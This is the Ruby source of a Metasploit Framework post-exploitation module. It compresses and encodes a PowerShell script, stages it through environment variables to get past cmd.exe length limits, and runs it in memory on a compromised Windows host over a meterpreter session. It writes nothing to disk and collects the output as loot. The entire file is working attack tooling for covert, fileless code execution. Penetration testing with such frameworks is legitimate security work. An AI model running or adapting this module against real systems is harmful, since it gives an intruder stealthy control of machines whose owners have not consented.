##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# Original script comments by nick[at]executionflow.org:
# Meterpreter script to deliver and execute powershell scripts using
# a compression/encoding method based on the powershell PoC code
# from rel1k and winfang98 at DEF CON 18. This script furthers the
# idea by bypassing Windows' command character lmits, allowing the
# execution of very large scripts. No files are ever written to disk.
##

require 'zlib' # TODO: check if this can be done with REX

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/powershell'

class Metasploit3 < Msf::Post
	include Msf::Post::Windows::Powershell

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Windows Manage PowerShell Download and/or Execute",
			'Description'          => %q{
				This module will download and execute a PowerShell script over a meterpreter session.
				The user may also enter text substitutions to be made in memory before execution.
				Setting VERBOSE to true will output both the script prior to execution and the results.
			},
			'License'              => MSF_LICENSE,
			'Version'              => '$Revision$',
			'Platform'             => ['windows'],
			'SessionTypes'         => ['meterpreter'],
			'Author'               => [
				'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter script
				'RageLtMan' # post module
				]
		))

		register_options(
			[
				OptPath.new( 'SCRIPT',  [true, 'Path to the PS script', ::File.join(Msf::Config.install_root, "scripts", "ps", "msflag.ps1") ]),
			], self.class)

		register_advanced_options(
			[
				OptString.new('SUBSTITUTIONS', [false, 'Script subs in gsub format - original,sub;original,sub' ]),
				OptBool.new(  'DELETE',        [false, 'Delete file after execution', false ]),
				OptBool.new(  'DRY_RUN',        [false, 'Only show what would be done', false ]),
				OptInt.new('TIMEOUT',   [false, 'Execution timeout', 15]),
			], self.class)

	end

	def run

		# Make sure we meet the requirements before running the script, note no need to return
		# unless error
		return 0 if ! (session.type == "meterpreter" || have_powershell?)

		# End of file marker
		eof = Rex::Text.rand_text_alpha(8)
		env_suffix = Rex::Text.rand_text_alpha(8)

		# check/set vars
		subs = process_subs(datastore['SUBSTITUTIONS'])
		script_in = read_script(datastore['SCRIPT'])

		script_name = ::File.basename(datastore['SCRIPT'])

		# Make substitutions in script if needed
		script_in = make_subs(script_in, subs) unless subs.empty?

		# Compress
		print_status('Compressing script contents.')
		compressed_script = compress_script(script_in, eof)
		if datastore['DRY_RUN']
			print_good("powershell -EncodedCommand #{compressed_script}")
			return
		end

		# If the compressed size is > 8100 bytes, launch stager
		if (compressed_script.size > 8100)
			print_error("Compressed size: #{compressed_script.size}")
			error_msg =  "Compressed size may cause command to exceed "
			error_msg += "cmd.exe's 8kB character limit."
			print_error(error_msg)
			print_status('Launching stager:')
			script = stage_to_env(compressed_script, env_suffix)
			print_good("Payload successfully staged.")
			require_cleanup = true
		else
			print_good("Compressed size: #{compressed_script.size}")
			script = compressed_script
			require_cleanup = false
		end

		# Execute the powershell script
		print_status('Executing the script.')
		cmd_out = execute_script(script, datastore['TIMEOUT'])
		vprint_good("Script Output:")
		vprint_line(cmd_out[:output])
		script_log = store_loot("host.command.powershell", "text/plain", session, cmd_out[:output] ,
			"#{script_name}.txt", "script Output #{script_name}")
		print_status("Command output saved to: #{script_log}")
		if require_cleanup
			vprint_status(cleanup(cmd_out[:pid], env_suffix))
		end

		# That's it
		print_good('Finished!')
	end

end

